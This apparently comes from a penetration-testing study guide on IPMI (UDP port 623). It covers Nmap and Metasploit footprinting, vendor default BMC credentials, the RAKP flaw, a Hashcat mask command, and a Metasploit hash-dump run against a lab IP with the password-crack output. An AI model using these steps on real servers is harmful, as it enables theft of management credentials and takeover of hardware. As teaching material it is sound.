# (623 UDP)IPMI

{% hint style="info" %}
<mark style="color:blue;">This document will be published upon completion of the module.</mark>
{% endhint %}

## About

[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.\
&#x20;It provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. \
IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.

To function, IPMI requires the following components:

* Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
* Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
* Intelligent Platform Management Bus (IPMB) - extends the BMC
* IPMI Memory - stores things such as the system event log, repository store data, and more
* Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

## Footprinting

### Nmap

```shell-session
$ sudo nmap <TARGET> -p 623 -sU --script ipmi-version  
```

### Metasploit

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
```

### Default Credentials

It is possible that administrators have not changed the default password. Here's a list of some default passwords depending on the product running IPMI:

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

Login credentials are always useful even if they don't give us access to whatever we were looking for, we could try to connect to another service using them. Here's a possible scenario:

### RAKP flaw

The RAKP **(Remote Authenticated Key-Exchange Protocol)** is part of the IPMI **(Intelligent Platform Management Interface)**, which is commonly used for managing and monitoring server hardware remotely.

RAKP is used in the authentication process for IPMI 2.0, particularly in the **RMCP+ (Remote Management Control Protocol Plus)** phase, which ensures secure communications between the client (e.g., an IPMI client) and the server (the BMC, or Baseboard Management Controller).

> If default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.

So in short, we'll be using metasploit to dump password hashes and crack them offline.

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts <TARGET>
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
